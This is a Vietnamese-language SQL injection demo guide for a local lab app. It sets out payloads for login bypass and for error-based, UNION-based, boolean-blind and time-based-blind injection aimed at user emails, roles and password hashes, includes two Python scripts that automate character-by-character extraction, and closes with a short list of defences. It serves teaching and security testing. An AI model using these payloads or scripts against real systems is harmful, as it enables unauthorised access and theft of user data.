# SQL Injection Demo - Tổng hợp các kỹ thuật

## 1. Classic SQLi - Bypass Login

### Payload:
```
Email: admin@example.com' OR '1'='1' --
Password: anything
```

### SQL được tạo ra:
```sql
SELECT * FROM users WHERE email='admin@example.com' OR '1'='1' --' AND password_digest='anything' LIMIT 1
```

### Giải thích:
- `'` đóng quote của email
- `OR '1'='1'` điều kiện luôn TRUE  
- `--` comment phần password check

---

## 2. Error-based SQLi - Khai thác lỗi DB

### Payloads:
```sql
-- Lấy version
1 AND (SELECT @@version)

-- Lấy tên database  
1 AND (SELECT database())

-- Lấy tên bảng
1 AND (SELECT table_name FROM information_schema.tables LIMIT 1)

-- Duplicate key error để extract data
1 AND (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)

-- Extract user email
1 AND (SELECT email FROM users WHERE id=1)
```

### Cách hoạt động:
- Inject SQL gây ra lỗi
- Database trả về error message chi tiết
- Error message chứa thông tin nhạy cảm

---

## 3. Union-based SQLi - Trích xuất dữ liệu

### Các bước:

#### Bước 1: Xác định số cột
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--  # Đúng số cột
```

#### Bước 2: Xác định kiểu dữ liệu
```sql
' UNION SELECT 1,'test','test'--
```

#### Bước 3: Lấy thông tin hệ thống
```sql
' UNION SELECT 1,@@version,database()--
' UNION SELECT 1,user(),@@datadir--
```

#### Bước 4: Lấy cấu trúc DB
```sql
' UNION SELECT 1,table_name,'table' FROM information_schema.tables--
' UNION SELECT 1,column_name,'column' FROM information_schema.columns WHERE table_name='users'--
```

#### Bước 5: Trích xuất dữ liệu
```sql
' UNION SELECT id,email,password_digest FROM users--
' UNION SELECT id,email,role FROM users WHERE role='admin'--
```

---

## 4. Boolean-based Blind SQLi - Đoán qua TRUE/FALSE

### Payloads test cơ bản:
```sql
-- Luôn TRUE
admin@test.com' OR '1'='1'--

-- Luôn FALSE  
admin@test.com' AND '1'='2'--
```

### Đoán thông tin từng bit:
```sql
-- Kiểm tra độ dài database name
admin@test.com' AND LENGTH(database())=20--

-- Đoán ký tự đầu tiên của database  
admin@test.com' AND SUBSTRING(database(),1,1)='s'--

-- Đoán ký tự thứ 2
admin@test.com' AND SUBSTRING(database(),2,1)='e'--

-- Kiểm tra số user
admin@test.com' AND (SELECT COUNT(*) FROM users)>5--

-- Đoán email admin
admin@test.com' AND (SELECT SUBSTRING(email,1,1) FROM users WHERE role='admin' LIMIT 1)='a'--
```

### Script tự động:
```python
def extract_database_name():
    extracted = ""
    for position in range(1, 50):
        for char in string.ascii_lowercase + string.digits:
            payload = f"admin@test.com' AND SUBSTRING(database(),{position},1)='{char}'--"
            response = requests.post(url, data={'email': payload})
            if response.json().get('exists') == True:
                extracted += char
                break
    return extracted
```

---

## 5. Time-based Blind SQLi - Đoán qua thời gian delay

### Payloads test cơ bản:
```sql
-- Test có delay 3 giây không
admin@test.com' AND IF(1=1,SLEEP(3),0)--

-- Test FALSE (không delay)
admin@test.com' AND IF(1=2,SLEEP(3),0)--
```

### Đoán thông tin:
```sql
-- Kiểm tra version MySQL
admin@test.com' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)--

-- Đoán tên database
admin@test.com' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)--

-- Đoán password hash
admin@test.com' AND IF((SELECT SUBSTRING(password_digest,1,1) FROM users LIMIT 1)='$',SLEEP(3),0)--

-- Kiểm tra có admin không
admin@test.com' AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(3),0)--
```

### Script tự động:
```python
def time_based_extract():
    extracted = ""
    for position in range(1, 50):
        for char in string.ascii_lowercase + string.digits:
            payload = f"admin@test.com' AND IF(SUBSTRING(database(),{position},1)='{char}',SLEEP(3),0)--"
            start = time.time()
            response = requests.post(url, data={'email': payload})
            if time.time() - start > 3:
                extracted += char
                break
    return extracted
```

---

## Demo URLs:

- **Classic SQLi:** http://localhost:3000/sqli/classic
- **Error-based SQLi:** http://localhost:3000/sqli/error-based  
- **Union-based SQLi:** http://localhost:3000/sqli/union
- **Boolean Blind SQLi:** http://localhost:3000/sqli/blind
- **Time-based Blind SQLi:** http://localhost:3000/sqli/time-based

---

## Mức độ nguy hiểm:

1. **Classic SQLi:** ⭐⭐⭐ - Dễ phát hiện, dễ khai thác
2. **Error-based SQLi:** ⭐⭐⭐⭐ - Lộ nhiều thông tin qua error  
3. **Union-based SQLi:** ⭐⭐⭐⭐⭐ - Trích xuất toàn bộ database
4. **Boolean Blind SQLi:** ⭐⭐⭐⭐ - Khó phát hiện, chậm nhưng hiệu quả
5. **Time-based Blind SQLi:** ⭐⭐⭐⭐⭐ - Cực kỳ khó phát hiện, rất nguy hiểm

## Cách phòng chống:

1. **Sử dụng Prepared Statements/Parameterized Queries**
2. **Input validation và sanitization**  
3. **Principle of least privilege cho DB user**
4. **Tắt error messages chi tiết ở production**
5. **Sử dụng ORM một cách an toàn**
6. **Web Application Firewall (WAF)**
7. **Regular security testing và code review**
